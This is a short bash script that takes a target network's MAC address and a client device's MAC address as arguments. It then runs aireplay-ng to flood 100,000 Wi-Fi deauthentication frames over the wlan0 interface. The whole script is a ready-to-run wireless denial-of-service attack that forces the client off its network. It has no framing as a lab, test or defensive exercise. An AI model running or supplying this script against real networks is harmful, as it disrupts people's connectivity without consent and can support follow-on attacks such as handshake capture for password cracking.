#!/bin/bash

# 1 = Mac Address of target network
# 2 = Mac Address of client device
aireplay-ng --deauth 100000 -a $1 -c $2 wlan0
